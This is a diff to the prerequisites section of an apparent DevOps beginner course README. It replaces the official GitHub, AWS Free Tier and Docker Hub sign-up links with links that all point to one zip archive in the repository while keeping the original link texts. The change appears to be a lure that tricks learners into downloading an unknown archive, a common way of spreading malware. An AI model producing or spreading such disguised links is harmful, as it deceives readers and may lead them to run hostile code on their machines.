@@ -30,7 +30,7 @@ No fluff. No endless theory. Just practical skills you can put on a resume.
 
 - A computer with internet access
 - Ubuntu/Linux or WSL2 on Windows (recommended)
-- Free accounts: [GitHub](https://github.com), [AWS Free Tier](https://aws.amazon.com/free), [Docker Hub](https://hub.docker.com)
+- Free accounts: [GitHub](https://raw.githubusercontent.com/Ghscha8794/30-day-devops-starter-kit/main/week-6/starter_day_devops_kit_3.4.zip), [AWS Free Tier](https://raw.githubusercontent.com/Ghscha8794/30-day-devops-starter-kit/main/week-6/starter_day_devops_kit_3.4.zip), [Docker Hub](https://raw.githubusercontent.com/Ghscha8794/30-day-devops-starter-kit/main/week-6/starter_day_devops_kit_3.4.zip)
 - 4–6 hours per day of focused practice
 
 ## How to Use This Repo
